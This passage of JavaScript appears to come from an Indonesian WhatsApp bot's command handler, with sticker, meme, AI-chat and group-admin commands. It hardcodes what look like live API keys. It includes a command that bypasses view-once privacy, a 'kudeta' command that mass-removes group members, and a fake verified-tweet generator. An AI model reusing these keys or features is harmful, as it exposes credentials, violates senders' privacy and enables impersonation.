    const apiKey = 'AIzaSyDKlf8gKxGNR3r7E4ShvozuWocWFdXCiLQ';
    const url = `https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash-latest:generateContent?key=${apiKey}`;
    
    const body = {
        contents: [
            {
                parts: [
                    { text: prompt }
                ]
            }
        ]
    };

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(body)
        });

        const data = await response.json();

        if (response.ok) {
            return data; // Mengembalikan data respons dari API
        } else {
            throw new Error(data.error.message || 'Request failed');
        }
    } catch (error) {
        console.error('Error:', error.message);
        return null;
    }
};
    
    try {
        const response = await sendToGemini(prompt); 
        if (response) {
            // Mengambil teks dari respons API
            const candidates = response.candidates;
            const message = candidates && candidates.length > 0
                ? candidates[0].content.parts[0].text // Mengambil bagian teks
                : 'Tidak ada respons yang diterima dari model.';

            // Menampilkan respons yang didapat dari Gemini
            reply(`${message}`);
        } else {
            reply('Gagal mendapatkan respons dari Gemini API.');
        }
    } catch (error) {
        console.error(error);
        reply('Terjadi kesalahan saat memproses permintaan Anda.');
    }
    }
    break

//===============================================================================

case 'gemini-image':  {
if (!isPremium) return reply(mess.prem)
async function GeminiImage(image, query) {
    const response = await fetch(`https://ai.xterm.codes/api/img2txt/gemini-image?key=Bell409`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ image, query })
    });

    if (!response.ok) {
        throw new Error('Network response was not ok ' + response.statusText);
    }
    const data = await response.json();
    return data.response;
}
async function RegularAPI(query) {
    const response = await fetch(`https://btch.us.kg/gptgo?text=${encodeURIComponent(query)}`);
    if (!response.ok) {
        throw new Error('Gagal mendapatkan respons dari API');
    }
    const data = await response.json();
    return data.result;
}

let q = m.quoted ? m.quoted : m;
let mime = (q.msg || q).mimetype || '';
    if (!text) return reply(`Example:\n.${command} siapa itu miyako?`);

    try {
        if (mime && mime.startsWith('image/')) {
            let media = await q.download();
            await reply("Please wait...");
            let res = await GeminiImage(media, text);
            reply(`🔮 ${res}`.trim(), m);
        } else {
            let res = await RegularAPI(text);
            reply(`🔮 ${res}`.trim(), m);
        }
    } catch (error) {
        console.error(error);
        reply(m.chat, 'Gagal mendapatkan respons dari API', m);
    }
}
break


//================================================================================


            
case "s": case "sticker": case "stiker": {
if (!/image|video/gi.test(mime)) return m.reply(example("dengan kirim media"))
if (/video/gi.test(mime) && qmsg.seconds > 15) return m.reply("Durasi vidio maksimal 15 detik!")
var image = await xyu.downloadAndSaveMediaMessage(qmsg)
await xyu.sendAsSticker(m.chat, image, m, {packname: global.botname})
await fs.unlinkSync(image)
}
break
//================================================================================

case 'smeme2': 
{
 if (!text) reply`contoh : smeme Hello|world`
if (/image/.test(mime)) {
atas = text.split('|')[0] ? text.split('|')[0] : '-'
bawah = text.split('|')[1] ? text.split('|')[1] : '-'
mee = await xyu.downloadAndSaveMediaMessage(quoted)
mem = await uploadToCatbox(mee)
kaytid = await getBuffer(`https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${mem}`)
                    xyu.sendImageAsSticker(m.chat, kaytid, m, { packname: global.packname, author: global.author })
                }
                }
                break
                
//================================================================================
case 'smeme': 
{
 if (!text) reply`Balas Image Dengan Caption ${prefix + command}`
if (/image/.test(mime)) {
atas = text.split('|')[0] ? text.split('|')[0] : '-'
bawah = text.split('|')[1] ? text.split('|')[1] : '-'
mee = await xyu.downloadAndSaveMediaMessage(quoted)
mem = await uploadToCatbox(mee)
kaytid = await getBuffer(`https://api.memegen.link/images/custom/-/${text}.png?background=${mem}`)
                    xyu.sendImageAsSticker(m.chat, kaytid, m, { packname: global.packname, author: global.author })
                }
                }
                break


//================================================================================

case "swm": case "stickerwm": case "stikerwm": case "wm": {
if (!text) return m.reply(example("namamu dengan kirim media"))
if (!/image|video/gi.test(mime)) return m.reply(example("namamu dengan kirim media"))
if (/video/gi.test(mime) && qmsg.seconds > 15) return m.reply("Durasi vidio maksimal 15 detik!")
var image = await xyu.downloadAndSaveMediaMessage(qmsg)
await xyu.sendAsSticker(m.chat, image, m, {packname: text})
await fs.unlinkSync(image)
}
break

//================================================================================
case 'sendfitur': case 'sendcase': {
if (!isCreator) return reply(mess.owner);
if (!m.quoted) return reply('Kutip pesan seseorang!');
if (!text) return reply(`Contoh: ${prefix+command} menu`);
const getCase = async (caseName) => {
try {
const fileContent = await fs.promises.readFile("./case.js", "utf-8");
const caseRegex = new RegExp(`case '${caseName}'[\\s\\S]*?break`, 'g');
const match = fileContent.match(caseRegex);
if (!match) {
return reply(`Case '${caseName}' tidak ditemukan.`);
}
return match[0];
} catch (error) {
return reply(`Terjadi kesalahan saat membaca file: ${error.message}`);
}};
const caseName = text.trim();
getCase(caseName)
.then(caseCode => {
const recipient = m.quoted ? m.quoted.sender : m.mentionedJid[0];
if (!recipient || !recipient.includes('@s.whatsapp.net')) {
return reply('Format ID WhatsApp tidak valid!');
}
const sendFeature = async (recipient, caseCode) => {
try {
const contact = (await xyu.onWhatsApp(recipient.split('@')[0]))[0] || {};
if (!contact) return reply('Kontak tidak ditemukan di WhatsApp.');
const message = `Hi, kamu dapet kiriman fitur nih dari Xyura!\n\n${caseCode}`;
await xyu.sendMessage(recipient, { text: message }, { quoted: m });
reply('Fitur berhasil terkirim!');
} catch (error) {
console.error('Terjadi kesalahan:', error.message);
reply('Terjadi kesalahan saat mengirim fitur: ' + error.message);
}};
sendFeature(recipient, caseCode);
})
.catch(error => reply(`Terjadi kesalahan: ${error.message}`));
}
break

//================================================================================
case 'rvo': case 'x': case '🐦': case 'lihat': {
if (!isPremium) return reply(mess.prem)
if (!m.quoted) return m.reply("dengan reply pesannya")
let msg = m.quoted.message
    let type = Object.keys(msg)[0]
if (!msg[type].viewOnce) return m.reply("Pesan itu bukan viewonce!")
    let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : type == 'videoMessage' ? 'video' : 'audio')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return xyu.sendMessage(m.chat, {video: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/image/.test(type)) {
        return xyu.sendMessage(m.chat, {image: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/audio/.test(type)) {
        return xyu.sendMessage(m.chat, {audio: buffer, mimetype: "audio/mpeg", ptt: true}, {quoted: m})
    } 
await xyu.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
}
break


//===============================================================================

case 'tess': { 
  const { createCanvas, registerFont, loadImage } = require('canvas');
  const path = require('path');
  const fs2 = require('fs');
  const fs = require('fs').promises;
  const axios = require('axios');

  async function getImageAndSaveToTempFile(imageURL) {
    try {
      const imageBuffer = await getImageBufferFromURL(imageURL); // Mengambil buffer gambar dari URL
      const tempFilePath = await saveBufferToTempFile(imageBuffer); // Menyimpan buffer gambar ke file sementara
      return tempFilePath; // Mengembalikan path file sementara
    } catch (error) {
      console.error('Error getting image and saving to temp file:', error);
      throw error;
    }
  }

  async function getImageBufferFromURL(imageURL) {
    try {
      const response = await axios.get(imageURL, { responseType: 'arraybuffer' });
      const imageBuffer = Buffer.from(response.data, 'binary');
      return imageBuffer;
    } catch (error) {
      console.error('Error fetching image:', error);
      throw error;
    }
  }

  async function saveBufferToTempFile(buffer) {
    try {
      const rootTempDir = '/tmp'; // Path absolut ke folder tmp di root
      const tempDir = path.join(__dirname, rootTempDir); // Path absolut ke folder tmp dalam proyek
      await fs.mkdir(tempDir, { recursive: true }); // Membuat direktori jika belum ada
      const tempFilePath = path.join(tempDir, `tempfile_${Date.now()}.jpg`); // Nama file sementara
      await fs.writeFile(tempFilePath, buffer); // Menyimpan buffer ke file sementara
      return tempFilePath; // Mengembalikan path file sementara
    } catch (error) {
      console.error('Error saving buffer to temp file:', error);
      throw error;
    }
  }

  async function smeme(text = '', text2 = '', gambarStik, borderWidth = 4) {
    try {
      if (!gambarStik) {
        return console.log('Enter a valid parameter for pp');
      }

      const bufferPp = await getImageAndSaveToTempFile(gambarStik);
      const imageSmeme = await loadImage(bufferPp);

      // Ambil dimensi asli gambar
      const canvasWidth = imageSmeme.width;
      const canvasHeight = imageSmeme.height;

      // Membuat kanvas dengan ukuran gambar asli
      const canvas = createCanvas(canvasWidth, canvasHeight);
      const ctx = canvas.getContext('2d');

      // Gambar gambar profil di kanvas
      ctx.drawImage(imageSmeme, 0, 0, canvasWidth, canvasHeight);

      // Tambahkan teks pada bagian tengah atas
      const fontSize = 100; // Ukuran font
      const fontFamily = 'LEMONMILK';
      const textColor = '#ffffff';
      const borderColor = '#000000'; // Warna border hitam
      registerFont('./Canvas/font/LEMONMILK-Bold.otf', { family: 'ArialNarrow' });
      ctx.font = `${fontSize}px ${fontFamily}`;

      // Menghitung lebar teks
      const textWidth = ctx.measureText(text).width;

      // Mengatur posisi X dan Y agar teks berada di tengah horizontal dan di atas kanvas
      const textX = canvasWidth / 2;
      let textY = fontSize;

      // Memisahkan teks menjadi beberapa baris jika terlalu panjang
      const maxLineWidth = canvasWidth - 40; // Lebar maksimum untuk satu baris teks
      let words = text.split(' ');
      let line = '';
      let lines = [];
      for (let word of words) {
        let testLine = line + word + ' ';
        let testLineWidth = ctx.measureText(testLine).width;
        if (testLineWidth > maxLineWidth) {
          lines.push(line);
          line = word + ' ';
        } else {
          line = testLine;
        }
      }
      lines.push(line);

      // Menggambar teks dengan border hitam
      ctx.strokeStyle = borderColor;
      ctx.lineWidth = borderWidth; // Lebar border
      ctx.textAlign = 'center'; // Teks diatur agar berada di tengah horizontal
      ctx.fillStyle = textColor;

      // Menggambar setiap baris teks
      for (let line of lines) {
        ctx.strokeText(line.trim(), textX, textY);
        ctx.fillText(line.trim(), textX, textY);
        textY += fontSize * 1.2; // Menggeser posisi Y untuk baris selanjutnya
      }

      // Tambahkan teks kedua di bagian bawah
      textY = canvasHeight - 20; // Mengatur posisi Y agar teks berada di bawah kanvas
      words = text2.split(' ');
      line = '';
      lines = [];
      for (let word of words) {
        let testLine = line + word + ' ';
        let testLineWidth = ctx.measureText(testLine).width;
        if (testLineWidth > maxLineWidth) {
          lines.push(line);
          line = word + ' ';
        } else {
          line = testLine;
        }
      }
      lines.push(line);

      // Menggambar setiap baris teks kedua
      for (let i = lines.length - 1; i >= 0; i--) {
        const line = lines[i];
        ctx.strokeText(line.trim(), textX, textY);
        ctx.fillText(line.trim(), textX, textY);
        textY -= fontSize * 1.2; // Menggeser posisi Y untuk baris sebelumnya
      }

      await fs.unlink(bufferPp);

      const buffer = canvas.toBuffer('image/png');
      return buffer;

    } catch (error) {
      console.error(error);
    }
  }
  
  const [smemeText1 = '', smemeText2 = ''] = text.trim().split('|');
  try {
    let dwnld = await xyu.downloadAndSaveMediaMessage(qmsg);
    let catBox = await uploadToCatbox(dwnld);
    const media = await smeme(smemeText1, smemeText2, catBox);
    let ngawiStik = await xyu.sendImageAsSticker(m.chat, media, m, {
      packname: packname,
      author: author
    });
    await fs.unlinkSync(ngawiStik);
  } catch (e) {
    return await xyu.sendMessage(from, { react: { text: "👾", key: m.key } });
  }
}
break;
//================================================================================


//================================================================================
case "tourl2": {
if (!/image/.test(mime)) return m.reply(example("dengan kirim/reply foto"))
let media = await xyu.downloadAndSaveMediaMessage(qmsg)
const { ImageUploadService } = require('node-upload-images')
const service = new ImageUploadService('pixhost.to');
let { directLink } = await service.uploadFromBinary(fs.readFileSync(media), 'TakashiBotz.png');

let teks = directLink.toString()
await xyu.sendMessage(m.chat, {text: teks}, {quoted: m})
await fs.unlinkSync(media)
}
break

//================================================================================

case "tourl": {
  if (!/video/.test(mime) && !/image/.test(mime)) 
    return m.reply(`*Send/Reply the Video/Image With Caption* ${prefix + command}`);
  if (!quoted) 
    return m.reply(`*Send/Reply the Video/Image Caption* ${prefix + command}`);

  let q = m.quoted ? m.quoted : m;

  xyu.sendMessage(from, {
    react: {
      text: '🎁',
      key: m.key
    }
  });

  let media = await q.download();
  let uploadImage = require('./lib/catmoe');
  let isTele = /image\/(png|jpe?g|gif)|video\/mp4/.test(mime);
  let link = await (isTele ? uploadImage : uploadFile)(media);

  const buttons = [
    {
      "name": "cta_copy",
      "buttonParamsJson": `{"display_text":"Copy URL","id":"1234","copy_code":"${link}"}`
    }
  ];

  const msg = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `*Your Link:* ${link}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
            buttons: buttons
          }),
          contextInfo: {
            mentionedJid: [m.sender],
            forwardingScore: 999,
            isForwarded: true
          }
        })
      }
    }
  }, { quoted: m });

  await xyu.relayMessage(m.chat, msg.message, {
    messageId: msg.key.id
  });
}
break;


//================================================================================

case 'tr':
case 'translate':{
if (!teks) return;
let teks = m.quoted && m.quoted.q ? m.quoted.text : q ? q : "";
let translate = require('translate-google-api')
let defaultLang = 'en'
let tld = 'cn'
let toks = `
Contoh:
${prefix + command} <lang> [text]
${prefix + command} id your messages
Daftar bahasa yang didukung: https://cloud.google.com/translate/docs/languages
`.trim()

let lang = args[0]
let text = args.slice(1).join(' ')
if ((args[0] || '').length !== 2) {
lang = defaultLang
text = args.join(' ')
}
if (!text && m.quoted && m.quoted.text) text = m.quoted.text
let result
try {
result = await translate(`${text}`, {to: lang})
} catch (e) {
result = await translate(`${text}`, {to: defaultLang,})
reply(toks)
} finally {
reply(result[0])
}
}
break;

//================================================================================

case 'remini': case 'hd': {
    if (!quoted) return reply(`Where is the picture?`);
    if (!/image/.test(mime)) return reply(`Send/Reply Photos With Captions ${prefix + command}`);
    reply(mess.wait);

    const Upscale = require('./lib/remini'); // Pastikan file Upscale.js ada di folder lib
    let media = await quoted.download(); // Download gambar dari pesan yang di-quote
    let buffer = await Upscale(media); // Proses peningkatan kualitas gambar

    if (!buffer) return reply(`Failed to enhance the image. Please try again.`);
    xyu.sendMessage(m.chat, { image: buffer, caption: "Done ya" }, { quoted: m });
}
break;

case 'hd2': {
if (!quoted) return reply(`Where is the picture?`)
if (!/image/.test(mime)) return reply(`Send/Reply Photos With Captions ${prefix + command}`)
reply(mess.wait)
const { remini } = require('./lib/remini2')
let media = await quoted.download()
let proses = await remini(media, "enhance")
xyu.sendMessage(m.chat, { image: proses, caption: mess.selesai}, { quoted: m})
}
break

//================================================================================

case 'add': {
if (!m.isGroup) return reply(mess.group);
if (!isCreator && !isAdmins) return (mess.owner);
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net';
try {
const participants = await xyu.groupMetadata(m.chat);
const memberJids = participants.participants.map(member => member.jid);
if (memberJids.includes(users)) {
m.reply('Target sudah menjadi anggota grup sebelumnya.');
} else {
await xyu.groupParticipantsUpdate(m.chat, [users], 'add');
m.reply('Sukses add target.');
}} catch (err) {
m.reply('Terjadi kesalahan.');
}}
break

//================================================================================

case "kick": case "kik": case 'k': {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (text || m.quoted) {
const input = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await xyu.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return m.reply("Nomor tidak terdaftar di whatsapp")
const res = await xyu.groupParticipantsUpdate(m.chat, [input], 'remove')
await m.reply(`Berhasil mengeluarkan ${input.split("@")[0]} dari grup ini`)
} else {
return m.reply(example("@tag/reply"))
}
}
break

//================================================================================

case "leave": {
if (!isCreator) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
await m.reply("Baik, Saya Akan Keluar Dari Grup Ini")
await sleep(4000)
await xyu.groupLeave(m.chat)
}
break

//================================================================================
case 'gfl': case "gantifile": case 'g': {
if (!isCreator) return 
if (!m.quoted) return reply(`*Example* : ${prefix + command} ./package.json`)
let files = fs.readdirSync(text.split(m.quoted.fileName)[0])
if (!files.includes(m.quoted.fileName)) return reply("File not found") 
let media = await downloadContentFromMessage(m.quoted, "document")
let buffer = Buffer.from([])
for await(const chunk of media) {
buffer = Buffer.concat([buffer, chunk])
}
fs.writeFileSync(text, buffer)
sendReaction("🕐")
await sleep(2000)
sendReaction("✅")
}
break
//===============================================================================
case 'get': {
  if (!isPremium) return m.reply(mess.premium);
  if (!isCreator) return
if (!text && !m.quoted) return reply(`awali *URL* dengan http:// atau https://`)
try {
const gt = await axios.get(text, {
headers: {
"Access-Control-Allow-Origin": "*",
"Referer": "https://www.google.com/",
"Referrer-Policy": "strict-origin-when-cross-origin",
"User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
},
responseType: 'arraybuffer' });
const contentType = gt.headers['content-type'];
console.log(`Content-Type: ${contentType}`);
if (/json/i.test(contentType)) {
const jsonData = JSON.parse(Buffer.from(gt.data, 'binary').toString('utf8'));
return reply(JSON.stringify(jsonData, null, 2));
} else if (/text/i.test(contentType)) {
const textData = Buffer.from(gt.data, 'binary').toString('utf8');
return reply(textData);
} else if (text.includes('webp')) {
return xyu.imgToSticker(m.chat, text, m, { packname: "", author: "Xyura - Mods!!" })
} else if (/image/i.test(contentType)) { return xyu.sendMessage(m.chat, { image: { url: text }}, { quoted: m });
} else if (/video/i.test(contentType)) { return xyu.sendMessage(m.chat, { video: { url: text }}, { quoted: m });
} else if (/audio/i.test(contentType) || text.includes(".mp3")) {
return xyu.sendMessage(m.chat, { audio: { url: text }}, { quoted: m });
} else if (/application\/zip/i.test(contentType) || /application\/x-zip-compressed/i.test(contentType)) {
return xyu.sendFile(m.chat, text, '', text, m)			
} else if (/application\/pdf/i.test(contentType)) {
return xyu.sendFile(m.chat, text, '', text, m)
} else {
return reply(`MIME : ${contentType}\n\n${gt.data}`);
}
} catch (error) {
console.error(`Terjadi kesalahan: ${error}`);
return reply(`Terjadi kesalahan saat mengakses URL: ${error.message}`);
}}
break

//================================================================================

case "resetlinkgc": {
if (!isCreator) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
await xyu.groupRevokeInvite(m.chat)
m.reply("Berhasil mereset link grup ✅")
}
break

//================================================================================

case "tagall": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!text) return m.reply(example("pesannya"))
let teks = text+"\n\n"
let member = await m.metadata.participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
await member.forEach((e) => {
teks += `@${e.split("@")[0]}\n`
})
await xyu.sendMessage(m.chat, {text: teks, mentions: [...member]}, {quoted: m})
}
break

//================================================================================

case "linkgc": {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
const urlGrup = "https://chat.whatsapp.com/" + await xyu.groupInviteCode(m.chat)
var teks = `
${urlGrup}
`
await xyu.sendMessage(m.chat, {text: teks, matchedText: `${urlGrup}`}, {quoted: m})
}
break

//================================================================================

case "h": case "hidetag": {
if (!m.isGroup) return Reply(mess.group);
if (!isCreator && !m.isAdmin) return Reply(mess.admin);
let text = m.quoted ? m.quoted.text : m.text.split(" ").slice(1).join(" ");
if (!text) return m.reply(example("pesannya"));
let member = m.metadata.participants.map(v => v.id);
await xyu.sendMessage(m.chat, { text: text, mentions: [...member] }, { quoted: m });
}
break;

//================================================================================

case "joingc": case "join": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("linkgcnya"))
if (!text.includes("chat.whatsapp.com")) return m.reply("Link tautan tidak valid")
let result = text.split('https://chat.whatsapp.com/')[1]
let id = await xyu.groupAcceptInvite(result)
m.reply(`Berhasil bergabung ke dalam grup ${id}`)
}
break

//================================================================================

case 'upch': {
    if (!isCreator) return reply(mess.owner);

    xyu.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });
    await sleep(2000);
    xyu.sendMessage(m.chat, { react: { text: '⌛', key: m.key } });

    if (args[0] === "audio") {
        if (!m.quoted) return reply("Reply pesan audio!");
        xyu.sendMessage(`${global.idSaluran}`, {
            audio: await m.quoted.download(),
            mimetype: 'audio/mp4',
            ptt: true
        });
    } else if (args[0] === "video") {
        if (!m.quoted) return reply("Reply pesan video!");
        xyu.sendMessage(`${global.idSaluran}`, {
            video: await m.quoted.download(),
            mimetype: 'video/mp4',
            caption: "Video yang dikirim"
        });
    } else if (args[0] === "text") {
        let text = m.quoted ? m.quoted.text : args.slice(1).join(" ");
        if (!text) return reply("Masukkan atau reply teks!");
        xyu.sendMessage(`${global.idSaluran}`, { text: text });
    } else {
        return reply("Gunakan format: upch <audio|video|text> [pesan]");
    }

    await sleep(2000);
    xyu.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
}
break;
//================================================================================

case "joinch": case "joinchannel": {
if (!isCreator) return Reply(mess.owner)
if (!text && !m.quoted) return m.reply(example("linkchnya"))
if (!text.includes("https://whatsapp.com/channel/") && !m.quoted.text.includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")
let result = m.quoted ? m.quoted.text.split('https://whatsapp.com/channel/')[1] : text.split('https://whatsapp.com/channel/')[1]
let res = await xyu.newsletterMetadata("invite", result)
await xyu.newsletterFollow(res.id)
m.reply(`
*Berhasil join channel whatsapp ✅*
* Nama channel : *${res.name}*
* Total pengikut : *${res.subscribers + 1}*
`)
}
break

//================================================================================

case 'acc': case 'acc-member': {
    if (!m.isGroup) return reply(mess.group); // Hanya bisa digunakan di grup
    if (!isCreator && !isAdmins) return reply(mess.admin); // Hanya admin atau creator yang bisa menggunakan
    try {
        let groupId = m.chat;
        // Mendapatkan daftar permintaan bergabung
        let joinRequestList = await xyu.groupRequestParticipantsList(groupId);
        if (!joinRequestList || joinRequestList.length === 0) {
            return reply("Tidak ada permintaan bergabung yang tertunda.");
        }
        // Menyetujui semua permintaan bergabung
        for (const request of joinRequestList) {
            await xyu.groupRequestParticipantsUpdate(groupId, [request.jid], 'approve');
        }
        // Balasan setelah semua permintaan disetujui
        reply(`✅ Semua permintaan bergabung (${joinRequestList.length}) telah disetujui.`);
    } catch (err) {
        console.error("Error processing acc:", err);
        reply("❌ Terjadi kesalahan saat memproses permintaan bergabung.");
    }
    }
    break;


//================================================================================

case "on": case "off": {
if (!isCreator) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
let gc = Object.keys(db.groups[m.chat])
if (!text || isNaN(text)) {
let teks = "\n*乂 List opstion group settings*\n\n"
await gc.forEach((i, e) => {
teks += `* ${e + 1}. ${capital(i)} : ${db.groups[m.chat][i] ? "_aktif_" : "_tidak aktif_"}\n`
})
teks += `\n Contoh penggunaan *.${command}* 1\n`
return m.reply(teks)
}
const num = Number(text)
let total = gc.length
if (num > total) return
const event = gc[num - 1]
global.db.groups[m.chat][event] = command == "on" ? true : false
return m.reply(`Berhasil *${command == "on" ? "mengaktifkan" : "mematikan"} ${event}* di grup ini`)
}
break

//================================================================================

case "closegc": case "close": 
case "opengc": case "open": {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (/open|opengc/.test(command)) {
if (m.metadata.announce == false) return 
await xyu.groupSettingUpdate(m.chat, 'not_announcement')
} else if (/closegc|close/.test(command)) {
if (m.metadata.announce == true) return 
await xyu.groupSettingUpdate(m.chat, 'announcement')
} else {}
}
break

//================================================================================

case "kudetagc": case "kudeta": {
if (!isCreator) return Reply(mess.owner)
let memberFilter = await m.metadata.participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
if (memberFilter.length < 1) return m.reply("Grup Ini Sudah Tidak Ada Member!")
await m.reply("Kudeta Grup By Xyuraa Starting 🔥")
for (let i of memberFilter) {
await xyu.groupParticipantsUpdate(m.chat, [i], 'remove')
await sleep(1000)
}
await m.reply("Kudeta Grup Telah Berhasil 🏴‍☠️")
}
break

//================================================================================

case "demote":
case "promote": {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (m.quoted || text) {
var action
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (/demote/.test(command)) action = "Demote"
if (/promote/.test(command)) action = "Promote"
await xyu.groupParticipantsUpdate(m.chat, [target], action.toLowerCase()).then(async () => {
await xyu.sendMessage(m.chat, {text: `Sukses ${action.toLowerCase()} @${target.split("@")[0]}`, mentions: [target]}, {quoted: m})
})
} else {
return m.reply(example("@tag/6285###"))
}
}
break

//================================================================================

case "addrespon": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("cmd|responnya"))
if (!text.split("|")) return m.reply(example("cmd|responnya"))
let result = text.split("|")
if (result.length < 2) return m.reply(example("cmd|responnya"))
const [ cmd, respon ] = result
let res = list.find(e => e.cmd == cmd.toLowerCase())
if (res) return m.reply("Cmd respon sudah ada")
let obj = {
cmd: cmd.toLowerCase(), 
respon: respon
}
list.push(obj)
fs.writeFileSync("./database/list.json", JSON.stringify(list, null, 2))
m.reply(`Berhasil menambah cmd respon *${cmd.toLowerCase()}* kedalam database respon`)
}
break

//================================================================================

case "delrespon": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("cmd\n\n ketik *.listrespon* untuk melihat semua cmd"))
const cmd = text.toLowerCase()
let res = list.find(e => e.cmd == cmd.toLowerCase())
if (!res) return m.reply("Cmd respon tidak ditemukan\nketik *.listrespon* untuk melihat semua cmd respon")
let position = list.indexOf(res)
await list.splice(position, 1)
fs.writeFileSync("./database/list.json", JSON.stringify(list, null, 2))
m.reply(`Berhasil menghapus cmd respon *${cmd.toLowerCase()}* dari database respon`)
}
break

//================================================================================

case "listrespon": {
if (!isCreator) return Reply(mess.owner)
if (list.length < 1) return m.reply("Tidak ada cmd respon")
let teks = "\n *#- List all cmd response*\n"
await list.forEach(e => teks += `\n* *Cmd :* ${e.cmd}\n`)
m.reply(`${teks}`)
}
break

//================================================================================

case 'delprem': {
if (!isCreator) return m.reply('Khusus developer')
if (!args[0]) return m.reply(`Penggunaan :\n*${prefix}delprem* @tag\n*${prefix}delprem* nomor`)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (users) {
premium.splice(prem.getPremiumPosition(users, premium), 1)
fs.writeFileSync('./database/premium.json', JSON.stringify(premium))
m.reply('Sukses!')
} else {
var cekpr = await xyu.onWhatsApp(args[0]+"@s.whatsapp.net")
if (cekpr.length == 0) return m.reply(`Masukkan nomer yang valid/terdaftar di WhatsApp`)
premium.splice(prem.getPremiumPosition(args[0] + '@s.whatsapp.net', premium), 1)
fs.writeFileSync('./database/premium.json', JSON.stringify(premium))
m.reply('Sukses!')
}}
break

//================================================================================

case "listprem": {
if (premium.length < 1) return m.reply("Tidak ada user premium ")
let teks = `\n *乂 List all premium  panel*\n`
for (let i of premium) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
xyu.sendMessage(m.chat, {text: teks, mentions: premium}, {quoted: m})
}
break

//================================================================================

case 'addprem': {
if (!isCreator) return m.reply('Khusus developer')
const swn = args.join(" ")
const pcknm = swn.split("|")[0];
const atnm = swn.split("|")[1];
if (!pcknm) return m.reply(`Penggunaan :\n*${prefix}addprem* @tag|waktu\n*${prefix}addprem* nomor|waktu\n\nContoh : ${prefix+command} @tag|30d`)
if (!atnm) return m.reply(`Mau yang berapa hari?`)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (users) {
prem.addPremiumUser((pcknm.replace('@','')+'@s.whatsapp.net').replace(' @','@'), atnm, premium)
m.reply('Sukses')
} else {
var cekap = await xyu.onWhatsApp(pcknm+"@s.whatsapp.net")
if (cekap.length == 0) return m.reply(`Masukkan nomer yang valid/terdaftar di WhatsApp`)
prem.addPremiumUser((pcknm.replace('@','')+'@s.whatsapp.net').replace(' @','@'), atnm, premium)
m.reply('Sukses')
}}
break

//================================================================================

case 'tiktoksearch':
case 'ttsearch': {
    const dann = require('d-scrape')
if (!text) return reply(`Contoh : ${prefix + command} jj epep`)
reply('Sedang Diproses ⏳')
try {
let anu = await dann.search.tiktoks(text)
xyu.sendMessage(m.chat, { video: { url: anu.no_watermark }, mimetype: 'video/mp4', caption: anu.title }, { quoted : m })
} catch (error) {
reply('Error :v')
}
}
break

//===============================================================================
case 'faketweet':{
const canvafy = require('canvafy')
if (!text) return reply(`Exmaple : Name1 | Name2 | Text`)
 nama1 = text.split("|")[0]
 nama2 = text.split("|")[1]
 katakata = text.split("|")[2]
const tweet = await new canvafy.Tweet()
  .setTheme("dim")
  .setUser({displayName: nama1, username: nama2})
  .setVerified(true)
  .setComment(katakata)
  .setAvatar(ppuser)
  .build();
 let tanaka = tweet
  xyu.sendMessage(m.chat, { image: tanaka, caption: 'Done' },{ quoted : m })     
}
break

//===============================================================================

case 'sertitolol': {
if (!text) throw `Example: ${prefix + command} username`
reply(mess.wait)
